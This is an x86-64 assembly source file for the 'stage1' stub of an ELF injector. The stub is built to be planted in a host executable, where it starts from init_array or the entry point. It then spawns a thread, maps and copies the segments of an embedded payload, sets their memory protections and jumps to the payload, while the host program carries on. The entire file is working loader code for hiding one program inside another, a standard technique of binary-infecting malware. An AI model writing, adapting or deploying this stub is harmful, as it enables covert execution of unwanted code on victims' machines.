; 0xN3utr0n - stage1.asm

default rel

%define MAP_GROWSDOWN		0x0100
%define MAP_ANONYMOUS		0x0020
%define MAP_PRIVATE			0x0002
%define PROT_READ			0x1
%define PROT_WRITE			0x2
%define PROT_EXEC			0x3

%define CLONE_VM			0x00000100
%define CLONE_FS			0x00000200
%define CLONE_FILES			0x00000400
%define CLONE_SIGHAND		0x00000800
%define CLONE_PARENT		0x00008000
%define CLONE_THREAD		0x00010000
%define CLONE_IO			0x80000000

%define SYS_MPROTECT		0xa
%define SYS_MMAP			0x9
%define SYS_CLONE			0x38
%define SYS_READLINK		0x59

%define PAGE_SIZE			4096
%define STACK_SIZE			(PAGE_SIZE * 1024)
%define ENTRY_NPIE			0x600000
%define MAX_BUFF			255

%define data(ptr, pos)			(ptr + pos * 8)
%define data(ptr, pos, size)	(ptr + pos * size)

%macro clean_regs 0
	xor esi, esi
	xor edi, edi
	xor eax, eax
	xor ebp, ebp
	xor edx, edx
	xor ecx, ecx
	xor r8d, r8d
	xor r9d, r9d
	xor r10d, r10d
	xor r11d, r11d
	xor r12d, r12d
	xor r13d, r13d
	xor r14d, r14d
	xor r15d, r15d
%endmacro

section .data
	size_data: dq 5, 0, 0, 0, 0, 0
	addr_data: dq 4, 0, 0, 0, 0, 0
	perm_data: db 1, 0, 0, 0, 0, 0
	link_str:  db '/proc/self/exe', 0
	payload_entryp: dq 7
	target_entryp : dq 8
	segment_vaddr : dq 9

section .text
	global _start

_start:
	test rdi, rdi
	jne init                          ; Jump if we are being called from init_array
	lea rdi, [rel _start]             ; Otherwise, set a return address
	lea rbx, [rel target_entryp]
	sub rdi, [rbx]
	push rdi                          ; Return address

init:
	lea rdi, [thread_init]
	call thread_create
	ret

thread_create:
	push rdi
	call stack_create
	lea rsi, [rax + STACK_SIZE - 8]
	pop qword [rsi]                   ; Function address
	mov rdi, CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_PARENT|CLONE_THREAD|CLONE_IO
	mov rax, SYS_CLONE
	syscall
	ret

stack_create:
	xor edi, edi
	xor r8d, r8d
	xor r9d, r9d
	mov rsi, STACK_SIZE
	mov rdx, PROT_WRITE | PROT_READ
	mov r10, MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN
	mov rax, SYS_MMAP
	syscall
	ret	

; GET FILEPATH argv[0]
thread_init:
	mov rsi, [rsi]
	jmp Loader

; GET FILEPATH argv[0]
non_thread_init:
	lea rdi, [rel link_str]
	sub rsp, MAX_BUFF
	mov rsi, rsp
	mov rdx, MAX_BUFF
	mov rax, SYS_READLINK
	syscall

; ----- START OF THE STUB ------
Loader:
	xor edi, edi
	push rdi	                         ; NULL
	push rdi	                         ; NULL (NO ENVIRON YET)
	push rdi	                         ; NULL
	push rsi	                         ; ARGV
	inc di		                         ; ARGC
	push rdi 
	clean_regs
	lea r12, [rel addr_data]
	lea r14, [rel size_data]
	lea r15, [rel perm_data]

;; Allocate memory for the payload's segments
load_segments:
	mov rdi, [data(r12,r13)]	         ; Segment virtual address
    mov rsi, [data(r14,r13)]	         ; Segment size
	call check_size
	mov edx, PROT_READ | PROT_WRITE	
	mov r10d, MAP_PRIVATE | MAP_ANONYMOUS	
	mov eax, SYS_MMAP
	syscall
	push rax                            ; New page-aligned address
	inc r13b
	mov rax, [data(r14,r13)]
	test rax, rax
	jne load_segments

;; Calculate the target's segment virtual address
	xor edx, edx
	lea rsi, [rel segment_vaddr]
	mov rsi, [rsi]
	lea rdi, [rel Loader]               ; A reference point 
	cmp rdi, ENTRY_NPIE                 ; is PIE (Position Independent Executable)? 
	jl copy_segments
	add rsi, rdi                        ; PIE confirmed

;;Copy the data to the allocated segments
copy_segments:
	mov rcx, [data(r14,rdx)]
	mov rdi, [data(r12,rdx)]
	rep movsb 
	inc dl
	mov rax, [data(r14,rdx)]
	test rax, rax
	jne copy_segments
	lea r8, [rdx-1]

;; Set the segment's expected permissions
change_protection:
	pop rdi
	mov rsi, [data(r14, r8)]
	movzx rdx, byte[data(r15, r8, 1)]
	mov eax, SYS_MPROTECT
	syscall
	dec r8b
	cmp r8b, MAX_BUFF                    ; 0xff == -1
	jne change_protection

	clean_regs
	lea r15, [rel payload_entryp]
	jmp [r15]
	ret 

;; If the segment's virtual address isn't aligned,
;; do it, and set a new size.
;; ((PageSize-1)&vaddr) ? ((vaddr) & ~(PageSize-1)):vaddr;
;; RDI = Virtual Address
;; RSI = Size
check_size:
	mov rax, PAGE_SIZE
	dec rax
	test rax, rdi
	je exit                             ; return if it's already aligned
	not rax
	and rax, rdi                        ; Segment aligned address
	add rsi, rdi
	sub rsi, rax                        ; New segment size

exit:
	ret
